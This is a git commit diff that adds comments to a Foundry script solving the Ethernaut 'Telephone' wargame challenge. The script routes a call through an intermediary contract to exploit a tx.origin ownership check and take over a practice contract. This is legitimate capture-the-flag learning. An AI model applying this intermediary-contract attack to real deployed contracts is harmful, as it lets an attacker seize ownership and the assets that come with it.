80a486c7788a226abe836a29e42ebc30918d3902
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-06 21:44:54 +0200

    docs(Telephone): style guide and comments

--- script/Telephone.s.sol
+++ script/Telephone.s.sol
@@ -2,34 +2,47 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import "../src/Telephone.sol";
+
+interface Telephone {
+    function changeOwner(address _owner) external;
+    function owner() external view returns (address);
+}
 
 contract Caller {
+    /// @notice The deployed Telephone contract address.
     Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);
 
+    /**
+     * @notice Changes the owner of the Telephone contract.
+     * @param _owner The address to set as the new owner.
+     */
     function changeOwner(address _owner) public {
         telephone.changeOwner(_owner);
     }
 
 }
 
+/// @author agadzhalov
+/// @title Solution to Telephone Ethernaut challange
+/// @notice Solution: tx.origin is always the initiator of the transaction, which means the EOA msg.sender is the address 
+///         of the account from which the current call is coming. It can be either a EOA or a smart contract accout.
 contract TelephoneScript is Script {
 
     Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);
 
-    Caller caller = new Caller();
-
-    /**
-     * Solution: tx.origin is always the initiator of the transaction, which means the EOA
-     * msg.sender is the address of the account from which the current call is coming.
-     * It can be either a EOA or a smart contract accout.
-     */
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        console.log("1. Owner before attack", telephone.owner());
+        Caller caller = new Caller();
+
+        // Log the current owner of the Telephone contract
+        console.log("1. Owner before attack:", telephone.owner());
+
+        // Execute ownership change to the specified wallet address
         caller.changeOwner(vm.envAddress("WALLLET_ADDRESS"));
-        console.log("2. Owner after attack", telephone.owner());
+
+        // Log the owner of the Telephone contract after the ownership change
+        console.log("2. Owner after attack:", telephone.owner());
 
         vm.stopBroadcast();
     }
